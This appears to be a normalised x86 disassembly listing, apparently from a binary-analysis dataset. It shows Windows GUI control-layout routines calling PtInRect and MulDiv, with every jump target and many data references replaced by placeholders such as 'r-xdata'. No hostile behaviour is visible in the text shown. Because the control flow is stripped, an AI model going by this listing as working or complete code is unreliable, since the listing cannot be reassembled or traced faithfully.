jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_43e92c
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_43ea18
push ebx
mov ebx eax
cmp [ ebx + 0x94 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0x94 ]
call sub_4040f0
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_43ea4c
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
sub_43ea98
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x84 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_43eac8
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esp + 0x11 ] eax
movsx eax [ esp + 0x11 ]
mov [ esp + 0x15 ] eax
movsx eax [ esp + 0x13 ]
mov [ esp + 0x19 ] eax
mov eax [ esp + 0x15 ]
mov [ esp ] eax
mov eax [ esp + 0x19 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_4153c0
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43bc78
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x28 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x28 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_404160
movzx eax [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_404160
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx edi
mov eax edi
call sub_43bca4
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_4153c0
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x30 ]
xor edx edx
xor eax eax
call sub_415348
lea edx [ esp + 0x30 ]
mov ecx esp
mov eax edi
call sub_43bbc8
sub_43ec0c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x122 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
sub_43ec4c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cb6c
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43ec8c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43ec84
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
and [ esi + 0x50 ] 0xffefffff
or [ esi + 0x50 ] 0x100000
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x5c ]
sub_43ecbc
test [ eax + 0x55 ] 0x40
jne r-xdata
retn
test [ eax + 0x1c ] 0x2
jne r-xdata
mov edx [ eax + 0x40 ]
mov [ eax + 0x180 ] edx
mov edx [ eax + 0x44 ]
mov [ eax + 0x184 ] edx
mov edx [ eax + 0x48 ]
mov [ eax + 0x188 ] edx
mov edx [ eax + 0x4c ]
mov [ eax + 0x18c ] edx
sub_43ed90
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43ab4c
mov eax esi
mov edx [ r-xdata ]
call sub_404114
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_43edc4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_43eede
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_43afa0
push ebx
push sub_440bdc
call sub_41eb1c
mov [ ebx + 0x1c0 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423d20
mov esi eax
mov [ ebx + 0x1a4 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_423ec8
mov [ ebx + 0x1dd ] 0x1
mov [ ebx + 0x1d4 ] 0xffffffff
mov [ ebx + 0x1b8 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_404288
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4563c8
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x1bc ]
call sub_404e98
lea eax [ ebx + 0x1bc ]
call sub_404e44
jmp r-xdata
mov [ ebx + 0x1db ] 0x0
movzx eax [ r-xdata ]
mov [ ebx + 0x192 ] al
mov [ ebx + 0x193 ] 0x2
mov [ ebx + 0x194 ] 0x1
mov [ ebx + 0x198 ] 0x1
mov [ ebx + 0x158 ] 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4493c8
mov esi eax
mov [ ebx + 0x1a0 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_4450a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43eee5
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
sub_43eee5
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_43ef08
push ebx
push esi
push edi
push ebp
call sub_404330
mov ebx edx
mov ebp eax
mov eax ebp
call sub_41dd10
cmp [ ebp + 0x1dc ] 0x0
je r-xdata
lea eax [ ebp + 0x1b0 ]
call sub_406af4
mov eax [ ebp + 0x1ac ]
call sub_403f64
cmp [ ebp + 0x30 ] 0x0
je r-xdata
mov [ ebp + 0x1dc ] 0x0
xor edx edx
mov eax ebp
call sub_439a44
cmp [ ebp + 0x1b4 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebp
call sub_43fcf4
mov eax ebp
call sub_43ff78
mov esi eax
test esi esi
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx + 0xb4 ]
mov eax [ ebp + 0x1a4 ]
call sub_403f64
mov eax [ ebp + 0x1c0 ]
test eax eax
je r-xdata
mov edx esi
dec edx
mov eax ebp
call sub_43ff3c
mov edi eax
mov edx edi
mov eax ebp
call sub_43fd60
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax ebp
call sub_43ff78
mov esi eax
test esi esi
jne r-xdata
mov eax [ ebp + 0x1a0 ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_43b098
test bl bl
jle r-xdata
call sub_41ebb4
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4042d8
sub_43efe8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d0 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_43f0ac
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4169c0
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403f64
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_443e44
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
mov edx esi
call sub_4167c8
mov edx [ eax + 0x1d4 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_416914
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4167c8
test eax eax
je r-xdata
sub_43f0bc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43fa94
xor eax eax
push ebp
push sub_43f0fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43b3d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f103
mov eax [ ebp - 0x4 ]
call sub_43fa9c
retn
sub_43f103
mov eax [ ebp - 0x4 ]
call sub_43efe8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_440ab4
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_43d400
sub_43f134
mov ecx [ eax + 0x1a0 ]
mov ecx [ ecx + 0x8 ]
add [ edx ] ecx
mov ecx [ eax + 0x1a0 ]
mov ecx [ ecx + 0xc ]
add [ edx + 0x4 ] ecx
mov ecx [ eax + 0x1a0 ]
mov ecx [ ecx + 0x10 ]
sub [ edx + 0x8 ] ecx
mov eax [ eax + 0x1a0 ]
mov eax [ eax + 0x14 ]
sub [ edx + 0xc ] eax
retn
sub_43f164
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ esi + 0x175 ] 0x0
je r-xdata
movzx eax [ ebp + 0x14 ]
movzx eax [ eax + rw-data ]
cmp al [ esi + 0x61 ]
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ esi + 0x179 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
sub eax [ edi ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0xc ] eax
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x10 ] eax
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x14 ] eax
test [ esi + 0x61 ] 0x4
je r-xdata
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x10 ] eax
movzx eax [ ebp + 0x14 ]
add al 0xfd
sub al 0x2
jb r-xdata
test [ esi + 0x61 ] 0x1
jne r-xdata
test [ esi + 0x61 ] 0x1
je r-xdata
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x14 ] eax
movzx eax [ ebp + 0x14 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
test [ esi + 0x61 ] 0x8
je r-xdata
mov eax [ esi + 0x175 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x165 ]
push eax
call MulDiv
mov edx [ ebp - 0x10 ]
sar edx 0x1
jns r-xdata
mov eax [ ebx ]
mov edx [ esi + 0x175 ]
sub edx [ esi + 0x165 ]
sub eax edx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ esi + 0x175 ]
sub edx [ esi + 0x165 ]
sub eax edx
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x78 ]
call sub_4494e0
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
jmp [ eax * 4 + jump_table_43f3c7 ]
sub al 0x3
jne r-xdata
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
test [ esi + 0x61 ] 0x2
jne r-xdata
test [ esi + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0x8 ] eax
adc edx 0x0
movzx eax [ ebp + 0x14 ]
cmp eax 0x5
ja r-xdata
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ ebp - 0x14 ]
je r-xdata
mov eax [ ebp - 0x14 ]
add [ edi + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
sub [ edi + 0xc ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
add [ edi ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub [ edi + 0x8 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ esi + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x44 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push edi
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xac ]
mov eax [ edi ]
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc ] eax
movzx eax [ ebp + 0x14 ]
cmp eax 0x6
ja r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x179 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ esi + 0x169 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ esi + 0x179 ]
sub edx [ esi + 0x169 ]
sub eax edx
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ esi + 0x179 ]
sub edx [ esi + 0x169 ]
sub eax edx
mov [ ebp - 0x14 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_43f48f ]
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x78 ]
call sub_4494e0
movzx eax [ r-xdata ]
and al [ esi + 0x61 ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x14 ]
sub edx eax
sub [ edi + 0x4 ] edx
jmp r-xdata
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x14 ]
sub edx eax
add [ edi + 0xc ] edx
jmp r-xdata
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x10 ]
sub edx eax
sub [ edi ] edx
jmp r-xdata
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x10 ]
sub edx eax
add [ edi + 0x8 ] edx
jmp r-xdata
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x10 ]
sub edx eax
add [ edi + 0x8 ] edx
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x14 ]
sub edx eax
add [ edi + 0xc ] edx
movzx eax [ r-xdata ]
and al [ esi + 0x61 ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esi + 0x175 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x16d ]
push eax
call MulDiv
mov edx [ ebp - 0x10 ]
sar edx 0x1
jns r-xdata
mov eax [ esi + 0x179 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ esi + 0x171 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
sub eax edx
mov [ ebp - 0x8 ] eax
adc edx 0x0
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
sub_43f544
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_443f88
test al al
je r-xdata
mov ecx esi
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_415348
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ ebx + 0x1a0 ]
mov edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
sub [ esi ] edx
mov eax [ ebx + 0x1a0 ]
mov edx [ eax + 0xc ]
add edx [ eax + 0x14 ]
sub [ esi + 0x4 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f5a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
movzx edx [ ebp - 0x5 ]
cmp edx 0x6
ja r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
jmp [ edx * 4 + jump_table_43f5ca ]
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp ebx eax
setl al
jmp r-xdata
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
add esi eax
cmp ebx esi
setge al
jmp r-xdata
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp ebx eax
setl al
jmp r-xdata
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
add esi eax
cmp ebx esi
setge al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx esi
mov ebx [ eax ]
call [ ebx + 0xa8 ]
sub_43f6d4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov esi eax
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ esi + 0x30 ]
call sub_43f544
lea ecx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_43f164
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f71c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43ff78
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_416668
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4167c8
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_43f6d4
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_43ff3c
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
xor esi esi
jmp r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_416844
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_4167c8
mov edx eax
mov ecx ebx
mov eax edi
call sub_43f5a4
pop ecx
test al al
je r-xdata
inc esi
sub_43f8a8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_43ff78
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_43ff3c
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_43ff3c
movzx edx [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_43f8fc
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1dc ] 0x0
je r-xdata
push ebp
call sub_43f8a8
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1db ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43f9db
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_43f71c
pop ecx
push ebp
mov al 0x2
call sub_43f71c
pop ecx
push ebp
mov al 0x3
call sub_43f71c
pop ecx
push ebp
mov al 0x4
call sub_43f71c
pop ecx
push ebp
mov al 0x5
call sub_43f71c
pop ecx
push ebp
mov al 0x6
call sub_43f71c
pop ecx
push ebp
xor eax eax
call sub_43f71c
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc6
call sub_404160
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403f64
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_404160
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b0 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_43fa00
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_443f88
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
